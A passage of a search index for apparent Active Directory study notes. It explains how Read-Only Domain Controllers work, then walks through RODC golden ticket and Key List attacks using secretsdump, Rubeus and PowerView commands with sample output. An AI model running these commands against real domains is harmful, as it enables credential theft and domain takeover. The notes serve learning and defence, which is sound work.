??","c":""},{"id":"read-only-domain-controller-rodc","u":"01_attacks-lateral-movement.html#read-only-domain-controller-rodc","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Read-Only Domain Controller (RODC)","c":"1. 📌 What is an RODC? A Read-Only Domain Controller (RODC) is a type of Domain Controller introduced in Windows Server 2008 that: Holds a read-only copy of Active Directory (AD) Is designed for untrusted or physically insecure environments (e.g., branch offices) Can authenticate users , but cannot modify AD data 👉 Think of it as: “A Domain Controller with limited trust and limited power”"},{"id":"how-rodc-works","u":"01_attacks-lateral-movement.html#how-rodc-works","sec":"Attacks + Lateral Movement","lvl":4,"t":"2. ⚙️ How RODC Works","c":"🔁 Replication Model"},{"id":"inbound-only-replication","u":"01_attacks-lateral-movement.html#inbound-only-replication","sec":"Attacks + Lateral Movement","lvl":4,"t":"Inbound only replication","c":"Receives data from writable DCs ❌ Never sends changes back 📂 Active Directory Database Stores: Users, groups, policies (read-only) Does NOT store by default: Password hashes Sensitive attributes (e.g., LAPS, BitLocker keys)"},{"id":"authentication-flow-1","u":"01_attacks-lateral-movement.html#authentication-flow-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Authentication Flow","c":"Case 1: Password Cached User logs in RODC checks local cache Authenticates locally ✅ Case 2: Password NOT Cached RODC forwards request to writable DC Writable DC authenticates Password may be cached (based on policy)"},{"id":"credential-caching-core-concept","u":"01_attacks-lateral-movement.html#credential-caching-core-concept","sec":"Attacks + Lateral Movement","lvl":4,"t":"3. 🔐 Credential Caching (Core Concept)","c":"Default Behavior ❌ No passwords stored Configurable via: Password Replication Policy (PRP)"},{"id":"prp-controls","u":"01_attacks-lateral-movement.html#prp-controls","sec":"Attacks + Lateral Movement","lvl":4,"t":"PRP Controls:","c":"Policy Type | Description | — | — | Allow | Accounts whose passwords CAN be cached | Deny | Accounts NEVER cached (e.g., Domain Admins) |"},{"id":"important-rule-1","u":"01_attacks-lateral-movement.html#important-rule-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Rule:","c":"For local authentication: ✅ User password must be cached ✅ Computer password must be cached"},{"id":"key-security-features","u":"01_attacks-lateral-movement.html#key-security-features","sec":"Attacks + Lateral Movement","lvl":4,"t":"4. 🛡️ Key Security Features","c":"1. Read-Only AD Database Prevents unauthorized AD modifications 2. Filtered Attribute Set (FAS) Sensitive attributes are never replicated Examples: BitLocker keys LAPS passwords 3. Credential Isolation Only selected credentials stored Limits blast radius if compromised 4. Admin Role Separation Local admin access can be delegated ❌ No Domain Admin privileges required 5. SYSVOL Protection Changes on RODC: ❌ Not replicated to domain 6. DNS (Read-Only / Secondary) Prevents DNS tampering"},{"id":"rodc-vs-writable-dc","u":"01_attacks-lateral-movement.html#rodc-vs-writable-dc","sec":"Attacks + Lateral Movement","lvl":4,"t":"5. ⚖️ RODC vs Writable DC","c":"Feature | Writable DC | RODC | — | — | — | AD Database | Read + Write | Read-Only | Password Storage | All accounts | Selective caching | Replication | Bi-directional | Inbound only | Admin Rights | Domain Admin needed | Delegatable | Security Risk | High impact | Limited (in theory) |"},{"id":"why-rodcs-are-important","u":"01_attacks-lateral-movement.html#why-rodcs-are-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"6. 🌍 Why RODCs Are Important","c":"✔️ 1. Branch Office Security Used where: Physical security is weak IT staff is limited ✔️ 2. Reduced Risk Exposure Even if stolen: No full AD database Limited credentials ✔️ 3. Local Authentication Allows logins without WAN dependency ✔️ 4. Controlled Credential Storage Prevents sensitive accounts from exposure ✔️ 5. Delegated Management Non-admin users can manage the server"},{"id":"real-world-misuse-very-important","u":"01_attacks-lateral-movement.html#real-world-misuse-very-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"7. ⚠️ Real-World Misuse (Very Important)","c":"This is where things start breaking: ❌ Common Mistakes Adding Domain Users / Authenticated Users to cache policy Allowing too many credentials to be cached Delegating RODC admin to low-priv users Treating RODC like a normal server"},{"id":"result-2","u":"01_attacks-lateral-movement.html#result-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"💥 Result:","c":"RODC becomes: “Almost a writable DC… but insecure”"},{"id":"key-takeaways","u":"01_attacks-lateral-movement.html#key-takeaways","sec":"Attacks + Lateral Movement","lvl":4,"t":"8. 🧠 Key Takeaways","c":"RODC is: A security trade-off , not a secure DC replacement Security depends heavily on: Password Replication Policy Who manages it Misconfigured RODC: Can lead to credential exposure Can become a pivot point for domain compromise"},{"id":"rodc-internal-design-key-attributes","u":"01_attacks-lateral-movement.html#rodc-internal-design-key-attributes","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 RODC Internal Design & Key Attributes","c":""},{"id":"rodc-administration-model-no-local-accounts","u":"01_attacks-lateral-movement.html#rodc-administration-model-no-local-accounts","sec":"Attacks + Lateral Movement","lvl":4,"t":"1. 🧩 RODC Administration Model (No Local Accounts)","c":"📌 Key Concept When a server becomes a Domain Controller: ❌ Local users/groups disappear ✅ Active Directory controls access 👉 So question: Who manages an RODC if Domain Admins shouldn’t log into it?"},{"id":"solution-managedby-attribute","u":"01_attacks-lateral-movement.html#solution-managedby-attribute","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Solution: managedBy Attribute","c":"Attribute: managedBy Stored on: RODC computer object in AD PS C:Userselad> Get-ADComputer RODC -Properties msDS-KrbTgtLink DistinguishedName : CN=RODC,CN=Computers,DC=shenanigans,DC=labs DNSHostName : RODC.shenanigans.labs Enabled : True msDS-KrbTgtLink : CN=krbtgt_25078,CN=Users,DC=shenanigans,DC=labs Name : RODC ObjectClass : computer ObjectGUID : 2b81a6b5-926d-438b-8003-cb173ce196d6 SamAccountName : RODC$ SID : S-1-5-21-1437000690-1664695696-1586295871-1110 UserPrincipalName : PS C:Userselad> Get-ADUser krbtgt_25078 -Properties msDS-SecondaryKrbTgtNumber,msDS-KrbTGTLinkBl DistinguishedName : CN=krbtgt_25078,CN=Users,DC=shenanigans,DC=labs Enabled : False GivenName : msDS-KrbTGTLinkBl : {CN=RODC,CN=Computers,DC=shenanigans,DC=labs} msDS-SecondaryKrbTgtNumber : 25078 Name : krbtgt_25078 ObjectClass : user ObjectGUID : bdac311c-60a7-45fc-8997-09cf258570c0 SamAccountName : krbtgt_25078 SID : S-1-5-21-1437000690-1664695696-1586295871-1111 Surname : UserPrincipalName : ✔️ What it does: Specifies a user or group That entity gets: ✅ Local Administrator access on the RODC ⚠️ Why This Matters This is NOT just informational (unlike normal AD objects) It directly controls administrative access"},{"id":"summary-5","u":"01_attacks-lateral-movement.html#summary-5","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Summary","c":"Attribute | Purpose | Impact | — | — | — | managedBy | Defines RODC admin | Grants local admin rights | Discovering RODCs is pretty easy. We can query for all “krbtgt” accounts in AD or simply ask for all computer accounts with attributes unique to RODCs (msDS-Reveal-OnDemandGroup, msDS-NeverRevealGroup, msDS-RevealedList, msDS-AuthenticatedToAccountList – described further down in the post). Searching for computers with the PrimaryGroupID set to ‘521’ will return domain RODCs (or search for DCs with “IsReadOnly” set to True) which effectively identifies them being in the group “Read-only Domain Controllers’. image.png"},{"id":"rodc-default-denied-groups-password-replication-protection","u":"01_attacks-lateral-movement.html#rodc-default-denied-groups-password-replication-protection","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 RODC Default Denied Groups (Password Replication Protection)","c":"📌 What is this? These are high-privilege Active Directory groups that are explicitly blocked from having their credentials cached on an RODC. 👉 Controlled via: msDS-NeverRevealGroup (Deny List)"},{"id":"default-denied-groups","u":"01_attacks-lateral-movement.html#default-denied-groups","sec":"Attacks + Lateral Movement","lvl":4,"t":"🚫 Default Denied Groups","c":"These groups are never allowed to have passwords stored on an RODC : Group | Why it is Protected | — | — | Cert Publishers | Can publish certificates → potential auth abuse | Domain Admins | Full domain control | Domain Controllers | Control AD replication & authentication | Enterprise Admins | Forest-wide control | Group Policy Creator Owners | Can modify GPOs → indirect privilege escalation | krbtgt | Kerberos signing account (Golden Ticket risk) | Read-only Domain Controllers | Prevent cross-RODC credential exposure | Schema Admins | Can modify AD schema (very high privilege) |"},{"id":"why-this-exists","u":"01_attacks-lateral-movement.html#why-this-exists","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Why This Exists","c":"🎯 Core Idea: “RODC should NEVER hold Tier Zero credentials” 🔥 If these were cached: Attacker compromises RODC ➜ dumps hashes ➜ Immediate: Domain takeover Forest compromise Golden Ticket creation"},{"id":"how-it-works-internally","u":"01_attacks-lateral-movement.html#how-it-works-internally","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ How It Works Internally","c":"When authentication happens: RODC checks: Is user in Allow List ( msDS-RevealOnDemandGroup )? Then checks: Is user in Deny List ( msDS-NeverRevealGroup )?"},{"id":"important-rule-2","u":"01_attacks-lateral-movement.html#important-rule-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Rule:","c":"Deny ALWAYS overrides Allow Even if: A Domain Admin is mistakenly added to Allow list ❌ ➡️ It still will NOT be cached"},{"id":"special-case-rodc-account-itself","u":"01_attacks-lateral-movement.html#special-case-rodc-account-itself","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Special Case: RODC Account Itself","c":"RODC computer account: Password IS stored locally But: ❌ Other RODC accounts are NOT cached 👉 Prevents: Credential sharing between RODCs"},{"id":"security-significance","u":"01_attacks-lateral-movement.html#security-significance","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Security Significance","c":"✔️ 1. Protects Tier Zero These groups are: Core identity controllers Must never exist on less-trusted systems ✔️ 2. Limits Blast Radius If RODC is compromised: Only non-critical accounts exposed ✔️ 3. Enforces Trust Boundary RODC = Lower trust zone Writable DC = Higher trust zone"},{"id":"reality-check-important-insight","u":"01_attacks-lateral-movement.html#reality-check-important-insight","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Reality Check (Important Insight)","c":"Even with this protection: ❌ Only these groups are protected by default ❌ Other privileged accounts (e.g., service accounts, delegated admins) may still be cached 👉 Meaning: Security depends heavily on how the Allow list is configured"},{"id":"authentication-design-in-rodc","u":"01_attacks-lateral-movement.html#authentication-design-in-rodc","sec":"Attacks + Lateral Movement","lvl":4,"t":"2. 🔑 Authentication Design in RODC","c":"RODC must authenticate users without full trust 📌 Core Requirement To authenticate locally: Needs user password Needs computer password 👉 But: RODC does NOT store all passwords"},{"id":"password-replication-control-critical","u":"01_attacks-lateral-movement.html#password-replication-control-critical","sec":"Attacks + Lateral Movement","lvl":4,"t":"3. 📋 Password Replication Control (Critical)","c":"This is controlled using two main attributes ✅ 1. Allowed List Attribute : msDS-RevealOnDemandGroup ✔️ Purpose: Defines: “Whose credentials can be fetched & cached” ❌ 2. Denied List Attribute: msDS-NeverRevealGroup ✔️ Purpose: Defines: “Whose credentials must NEVER be cached” ⚠️ Priority Rule Deny list ALWAYS wins Get-ADComputer $ROCName -Property * | Select Name,ManagedBy,’msDS-AuthenticatedToAccountlist’,’msDS-NeverRevealGroup’,’msDS-RevealedDSAs’,’msDS-RevealedUsers’,’msDS-RevealOnDemandGroup’ image.png"},{"id":"summary-6","u":"01_attacks-lateral-movement.html#summary-6","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Summary","c":"Attribute | Role | Behavior | — | — | — | msDS-RevealOnDemandGroup | Allow list | Can cache credentials | msDS-NeverRevealGroup | Deny list | Never cache |"},{"id":"authentication-flow-step-by-step","u":"01_attacks-lateral-movement.html#authentication-flow-step-by-step","sec":"Attacks + Lateral Movement","lvl":4,"t":"4. 🔄 Authentication Flow (Step-by-Step)","c":"Case: Password NOT Cached User logs in RODC → forwards request to writable DC Writable DC authenticates user RODC requests password If allowed → password cached locally Case: Password Cached User logs in RODC authenticates locally ✅"},{"id":"kerberos-design-in-rodcs","u":"01_attacks-lateral-movement.html#kerberos-design-in-rodcs","sec":"Attacks + Lateral Movement","lvl":4,"t":"5. 🔐 Kerberos Design in RODCs","c":"📌 Problem: RODC cannot use domain-wide KRBTGT key ✔️ Solution: Per-RODC KRBTGT Account Each RODC gets: A unique Kerberos service account Naming Format: KRBTGT_XXXXX image.png"},{"id":"key-attributes","u":"01_attacks-lateral-movement.html#key-attributes","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔗 Key Attributes","c":"1. On RODC Computer Object: msDS-KrbTgtLink Points to its KRBTGT account 2. On KRBTGT Account: msDS-KrbTgtLinkBl (backlink) Points back to RODC 3. Key Version: msDS-SecondaryKrbTgtNumber Tracks key version (kvno)"},{"id":"summary-7","u":"01_attacks-lateral-movement.html#summary-7","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Summary","c":"Component | Purpose | — | — | KRBTGT (domain) | Full domain tickets | KRBTGT_XXXXX | RODC-specific tickets | msDS-KrbTgtLink | RODC → KRBTGT mapping |"},{"id":"ticket-generation-in-rodc","u":"01_attacks-lateral-movement.html#ticket-generation-in-rodc","sec":"Attacks + Lateral Movement","lvl":4,"t":"6. 🎟️ Ticket Generation in RODC","c":"✔️ When RODC issues TGT: Uses: Its own KRBTGT_XXXXX key Includes: kvno (key version number) ✔️ Ticket Usage: Can request: Service tickets (TGS) ✔️ Validation by Writable DC: Writable DC will accept RODC TGT only if: ✅ User is in msDS-RevealOnDemandGroup ❌ NOT in msDS-NeverRevealGroup"},{"id":"ticket-upgrade","u":"01_attacks-lateral-movement.html#ticket-upgrade","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Ticket Upgrade","c":"RODC-issued TGT can be: Upgraded to: Full domain TGT By requesting: Service: KRBTGT"},{"id":"credential-tracking-attributes","u":"01_attacks-lateral-movement.html#credential-tracking-attributes","sec":"Attacks + Lateral Movement","lvl":4,"t":"7. 📊 Credential Tracking Attributes","c":"These are extremely important for visibility: 1. msDS-RevealedList Users whose passwords are: ✅ Cached on RODC 2. msDS-AuthenticatedToAccountList Users who: ✅ Authenticated via RODC"},{"id":"summary-8","u":"01_attacks-lateral-movement.html#summary-8","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Summary","c":"Attribute | Tracks | — | — | msDS-RevealedList | Cached credentials | msDS-AuthenticatedToAccountList | Authenticated users |"},{"id":"rodc-specific-attributes-overview","u":"01_attacks-lateral-movement.html#rodc-specific-attributes-overview","sec":"Attacks + Lateral Movement","lvl":4,"t":"8. 🧬 RODC-Specific Attributes Overview","c":"Attribute | Function | Importance | — | — | — | managedBy | RODC admin control | 🔥 High | msDS-RevealOnDemandGroup | Allowed credential caching | 🔥 High | msDS-NeverRevealGroup | Denied credential caching | 🔥 High | msDS-RevealedList | Cached users | Medium | msDS-AuthenticatedToAccountList | Auth history | Medium | msDS-KrbTgtLink | Links KRBTGT account | 🔥 High |"},{"id":"why-these-attributes-are-important","u":"01_attacks-lateral-movement.html#why-these-attributes-are-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"9. 🎯 Why These Attributes Are Important","c":"✔️ Security Control Layer Define: Who can authenticate Whose credentials are exposed ✔️ Authentication Logic Entire RODC authentication depends on: These attributes ✔️ Kerberos Isolation Separate KRBTGT: Limits blast radius ✔️ Visibility & Auditing You can: Track cached users Track authentication patterns"},{"id":"final-understanding","u":"01_attacks-lateral-movement.html#final-understanding","sec":"Attacks + Lateral Movement","lvl":4,"t":"10. 🧠 Final Understanding","c":"RODC is NOT just: “A read-only DC” It is actually: “A controlled authentication proxy with selective credential storage and isolated Kerberos trust”"},{"id":"all-ways-to-get-admin-on-an-rodc","u":"01_attacks-lateral-movement.html#all-ways-to-get-admin-on-an-rodc","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 All Ways to Get Admin on an RODC","c":"Think in terms of what you control :"},{"id":"control-the-rodc-host-os-level","u":"01_attacks-lateral-movement.html#control-the-rodc-host-os-level","sec":"Attacks + Lateral Movement","lvl":4,"t":"1. 🖥️ Control the RODC Host (OS-Level)","c":"✔️ Methods Credential reuse (local admin creds) Service exploitation Pass-the-Hash / Kerberos auth Interactive sessions (RDP, WinRM) 🎯 Result Direct: Local admin / SYSTEM Dump: Cached creds KRBTGT_XXXXX"},{"id":"control-the-rodc-ad-object-most-powerful","u":"01_attacks-lateral-movement.html#control-the-rodc-ad-object-most-powerful","sec":"Attacks + Lateral Movement","lvl":4,"t":"2. 🧬 Control the RODC AD Object (Most Powerful)","c":"This is where most escalation comes from. ✔️ If you have ACLs like: GenericAll GenericWrite WriteDACL WriteOwner"},{"id":"you-can-abuse","u":"01_attacks-lateral-movement.html#you-can-abuse","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 You can abuse:","c":"(A) managedBy Add yourself → become admin (B) Password Replication Attributes msDS-RevealOnDemandGroup msDS-NeverRevealGroup 👉 Enables: Credential exposure (Key List attack later) (C) RBCD Set msDS-AllowedToActOnBehalfOfOtherIdentity Impersonate users to RODC (D) Shadow Credentials Add msDS-KeyCredentialLink Authenticate as RODC computer account"},{"id":"abuse-delegated-admin-model","u":"01_attacks-lateral-movement.html#abuse-delegated-admin-model","sec":"Attacks + Lateral Movement","lvl":4,"t":"3. 👥 Abuse Delegated Admin Model","c":"✔️ Paths (A) Compromise RODC Admin Group Users in managedBy (B) Weak Group Control You can: Modify group membership Add yourself 🎯 Result Become RODC admin indirectly"},{"id":"credential-based-access","u":"01_attacks-lateral-movement.html#credential-based-access","sec":"Attacks + Lateral Movement","lvl":4,"t":"4. 🔐 Credential-Based Access","c":"✔️ If any of these are cached on RODC: Local IT admins Service accounts Delegated admins 🎯 You can: Dump them Reuse credentials Pivot to admin"},{"id":"kerberos-delegation-abuse","u":"01_attacks-lateral-movement.html#kerberos-delegation-abuse","sec":"Attacks + Lateral Movement","lvl":4,"t":"5. ⚙️ Kerberos Delegation Abuse","c":"✔️ RBCD (you mentioned) Needs chaining ✔️ Constrained Delegation (RODC has it enabled) RODCs have: TrustedToAuthForDelegation = TRUE 👉 Meaning: They can request TGS on behalf of users"},{"id":"abuse-scenario","u":"01_attacks-lateral-movement.html#abuse-scenario","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Abuse scenario:","c":"If you control RODC machine account: You can leverage delegation flows"},{"id":"golden-ticket-key-list-attack","u":"01_attacks-lateral-movement.html#golden-ticket-key-list-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"Golden Ticket + Key List Attack","c":""},{"id":"rodc-golden-ticket","u":"01_attacks-lateral-movement.html#rodc-golden-ticket","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 1. RODC Golden Ticket","c":"📌 Concept Similar to classic Golden Ticket But uses: RODC-specific KRBTGT ( KRBTGT_XXXXX ) Scope is limited to: Users allowed by msDS-RevealOnDemandGroup ✅ Prerequisites You must have: ✔️ Local admin access on RODC ✔️ Ability to dump secrets (LSASS / ntds.dit) ✔️ Extract: KRBTGT_XXXXX AES/NT hash ✔️ Domain SID ✔️ Target user RID"},{"id":"extracting-rodc-krbtgt-key","u":"01_attacks-lateral-movement.html#extracting-rodc-krbtgt-key","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Extracting RODC KRBTGT Key","c":"Example (using secretsdump-like approach): secretsdump.py-just-dc-user krbtgt_25078 domain.local/rodc$@RODC-IP 👉 Output: AES256 / NTLM hash of RODC KRBTGT"},{"id":"forge-rodc-golden-ticket","u":"01_attacks-lateral-movement.html#forge-rodc-golden-ticket","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Forge RODC Golden Ticket","c":"Using Rubeus : Rubeus.exe golden \\ /rodcNumber:25078 \\ /aes256:<KRBTGT_AES256_HASH> \\ /user:admin \\ /id:1136 \\ /domain:shenanigans.labs \\ /sid:S-1-5-21-XXXXX [*] Action: Build TGT [*] Building PAC [*] Domain : SHENANIGANS.LABS (SHENANIGANS) [*] SID : S-1-5-21-1437000690-1664695696-1586295871 [*] UserId : 1136 [*] Groups : 520,512,513,519,518 [*] ServiceKey : EACD894DD0D934E84DE35860CE06A4FAC591CA63C228DDC1C7A0EBBFA64C7545 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256 [*] KDCKey : EACD894DD0D934E84DE35860CE06A4FAC591CA63C228DDC1C7A0EBBFA64C7545 [*] KDCKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256 [*] Service : krbtgt [*] Target : shenanigans.labs [*] Generating EncTicketPart [*] Signing PAC [*] Encrypting EncTicketPart [*] Generating Ticket [*] Generated KERB-CRED [*] Forged a TGT for 'admin@shenanigans.labs' [*] AuthTime : 1/19/2023 8:05:52 PM [*] StartTime : 1/19/2023 8:05:52 PM [*] EndTime : 1/20/2023 6:05:52 AM [*] RenewTill : 1/26/2023 8:05:52 PM [*] base64(ticket.kirbi): doIFgzCCBX+gAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoRIbEFNIRU5BTklHQU5TLkxBQlOi JTAjoAMCAQKhHDAaGwZ"},{"id":"whats-happening-internally","u":"01_attacks-lateral-movement.html#whats-happening-internally","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 What’s Happening Internally","c":"/rodcNumber → maps to: msDS-SecondaryKrbTgtNumber Ticket is: Signed using RODC KRBTGT PAC is: Forged locally"},{"id":"limitation-2","u":"01_attacks-lateral-movement.html#limitation-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Limitation","c":"This ticket only works if: ✔️ User is in msDS-RevealOnDemandGroup ❌ Not in msDS-NeverRevealGroup"},{"id":"key-list-attack","u":"01_attacks-lateral-movement.html#key-list-attack","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 2. Key List Attack","c":"📌 Concept Abuses: RODC’s ability to request credentials from writable DC ✅ Prerequisites ✔️ RODC Golden Ticket (from previous step) ✔️ Target account must be: Allowed in msDS-RevealOnDemandGroup Not denied"},{"id":"request-key-list-extract-nt-hash","u":"01_attacks-lateral-movement.html#request-key-list-extract-nt-hash","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Request Key List (Extract NT Hash)","c":"Rubeus.exe asktgs \\ /ticket:<base64_TGT> \\ /service:krbtgt/domain.local \\ /dc:dc1.domain.local \\ /keyList \\ /enctype:aes256 ServiceName : krbtgt/SHENANIGANS.LABS ServiceRealm : SHENANIGANS.LABS UserName : admin UserRealm : SHENANIGANS.LABS StartTime : 1/19/2023 8:06:36 PM EndTime : 1/20/2023 6:05:52 AM RenewTill : 1/1/0001 12:00:00 AM Flags : name_canonicalize, pre_authent KeyType : aes256_cts_hmac_sha1 Base64(key) : 1KBODJsZr0COB8F0hGmHmY87dvn1tF57tcgd8op65I8= Password Hash : 64F12CDDAA88057E06A81B54E73B949B"},{"id":"what-happens-internally","u":"01_attacks-lateral-movement.html#what-happens-internally","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 What Happens Internally","c":"Sends: TGS-REQ with KERB-KEY-LIST-REQ DC responds: KERB-KEY-LIST-REP Output includes: NT hash of target user"},{"id":"result-3","u":"01_attacks-lateral-movement.html#result-3","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Result","c":"👉 You now have: NT hash of target account Can perform: Pass-the-Hash Kerberos abuse"},{"id":"attribute-manipulation-core-escalation-logic","u":"01_attacks-lateral-movement.html#attribute-manipulation-core-escalation-logic","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 3. Attribute Manipulation (Core Escalation Logic)","c":"📌 Concept Control over RODC object ⇒ control over: Who’s credentials can be retrieved ✅ Prerequisites You must have one of: ✔️ GenericAll ✔️ GenericWrite ✔️ WriteDACL ✔️ WriteOwner ✔️ WriteProperty (on relevant attributes) https://app.notion.com https://app.notion.com"},{"id":"add-target-to-allowed-list","u":"01_attacks-lateral-movement.html#add-target-to-allowed-list","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Add Target to Allowed List","c":"Using PowerView: Set-DomainObject-IdentityRODC$-Set @{ 'msDS-RevealOnDemandGroup'=@( 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local' ) }"},{"id":"verify-change","u":"01_attacks-lateral-movement.html#verify-change","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Verify Change","c":"Get-DomainComputer RODC -Properties msDS-RevealOnDemandGroup"},{"id":"remove-from-deny-list-if-needed","u":"01_attacks-lateral-movement.html#remove-from-deny-list-if-needed","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Remove from Deny List (if needed)","c":"Set-DomainObject -Identity RODC$ -Clear 'msDS-NeverRevealGroup'"},{"id":"what-this-does-1","u":"01_attacks-lateral-movement.html#what-this-does-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 What This Does","c":"Expands: Who RODC is allowed to fetch credentials for Breaks: Default trust boundary"},{"id":"gaining-admin-access-to-rodc-via-managedby","u":"01_attacks-lateral-movement.html#gaining-admin-access-to-rodc-via-managedby","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 4. Gaining Admin Access to RODC (via managedBy)","c":"📌 Concept managedBy ⇒ local admin on RODC 🛠️ Modify managedBy Set-DomainObject-IdentityRODC$-Set @{ managedBy='CN=attacker,CN=Users,DC=domain,DC=local' }"},{"id":"result-4","u":"01_attacks-lateral-movement.html#result-4","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Result","c":"Attacker becomes: Local admin on RODC Can: Dump credentials Extract KRBTGT"},{"id":"how-we-get-the-hash-after-golden-ticket","u":"01_attacks-lateral-movement.html#how-we-get-the-hash-after-golden-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"How we get the hash after golden ticket ??","c":""},{"id":"goal-1","u":"01_attacks-lateral-movement.html#goal-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Goal","c":"You have: ✔️ RODC admin access ✔️ RODC KRBTGT_XXXXX key ✔️ Modified: msDS-RevealOnDemandGroup → includes Domain Admin msDS-NeverRevealGroup → cleared / doesn’t block 👉 Goal: Get Domain Admin NT hash"},{"id":"step-by-step-what-actually-happens","u":"01_attacks-lateral-movement.html#step-by-step-what-actually-happens","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Step-by-Step: What Actually Happens","c":"1. 🧾 You Forge an RODC TGT Using Rubeus , you create a ticket like: Rubeus.exe golden /rodcNumber:25078 /aes256:<RODC_KRBTGT_KEY> /user:Administrator /id:500 /domain:corp.local /sid:S-1-5-21-XXXXX 🔍 Internally You are saying: “I am Administrator, authenticated by THIS RODC” Ticket is: Signed with RODC KRBTGT Contains: User = Administrator Groups = Domain Admins, etc."},{"id":"why-this-ticket-is-trusted","u":"01_attacks-lateral-movement.html#why-this-ticket-is-trusted","sec":"Attacks + Lateral Movement","lvl":4,"t":"2. 🧠 Why This Ticket Is Trusted","c":"When you send this ticket to a writable DC: The DC checks: ✔️ Condition 1: Is user allowed for this RODC? msDS-RevealOnDemandGroup → ✔️ YES ✔️ Condition 2: Is user denied? msDS-NeverRevealGroup → ❌ NO (you removed it) 👉 Result: Writable DC accepts the RODC-issued identity"},{"id":"you-send-a-special-request-key-list","u":"01_attacks-lateral-movement.html#you-send-a-special-request-key-list","sec":"Attacks + Lateral Movement","lvl":4,"t":"3. 🔑 You Send a Special Request (Key List)","c":"Now you don’t request a normal service ticket. You send: Rubeus.exe asktgs /ticket:<TGT> /service:krbtgt/corp.local /keyList 🔍 What This Means You are asking: “Give me the keys (credentials) for this user”"},{"id":"what-writable-dc-does-internally","u":"01_attacks-lateral-movement.html#what-writable-dc-does-internally","sec":"Attacks + Lateral Movement","lvl":4,"t":"4. ⚙️ What Writable DC Does Internally","c":"This is the critical part . 🧠 Normal Behavior (Legitimate RODC) When a real RODC needs NTLM support: It asks DC: “Give me the password/hash of user X” DC checks: Is RODC allowed to know this user’s credentials? If YES: DC sends: NT hash Kerberos keys 🔥 What You Did You spoofed the RODC itself Your forged TGT = “I am a trusted RODC acting for this user” 👉 So DC believes: “This RODC is allowed to retrieve Administrator’s credentials”"},{"id":"dc-responds-with-credentials","u":"01_attacks-lateral-movement.html#dc-responds-with-credentials","sec":"Attacks + Lateral Movement","lvl":4,"t":"5. 📥 DC Responds with Credentials","c":"DC sends: KERB-KEY-LIST-REP Containing: Password Hash : <NTLM hash of Administrator>"},{"id":"final-result-2","u":"01_attacks-lateral-movement.html#final-result-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Final Result","c":"You now have: ✔️ Domain Admin NT hash ✔️ Can perform: Pass-the-Hash Silver Ticket Full domain compromise"},{"id":"why-this-works-core-insight","u":"01_attacks-lateral-movement.html#why-this-works-core-insight","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Why This Works (Core Insight)","c":""},{"id":"root-cause","u":"01_attacks-lateral-movement.html#root-cause","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔑 Root Cause","c":"RODCs are trusted to retrieve credentials for allowed users"},{"id":"trust-is-controlled-by","u":"01_attacks-lateral-movement.html#trust-is-controlled-by","sec":"Attacks + Lateral Movement","lvl":2,"t":"❗ Trust is Controlled By:","c":"msDS-RevealOnDemandGroup msDS-NeverRevealGroup"},{"id":"you-broke-the-model-by","u":"01_attacks-lateral-movement.html#you-broke-the-model-by","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔥 You Broke the Model By:","c":"Adding Domain Admin to allowed list Removing from deny list Forging RODC identity 👉 So DC thinks: “This is a legitimate RODC requesting valid credentials”"},{"id":"important-clarification-1","u":"01_attacks-lateral-movement.html#important-clarification-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Clarification","c":"This is NOT: Cracking password Dumping LSASS from DC 👉 It is: Asking DC to hand over the hash legitimately"},{"id":"why-golden-ticket-alone-is-not-enough","u":"01_attacks-lateral-movement.html#why-golden-ticket-alone-is-not-enough","sec":"Attacks + Lateral 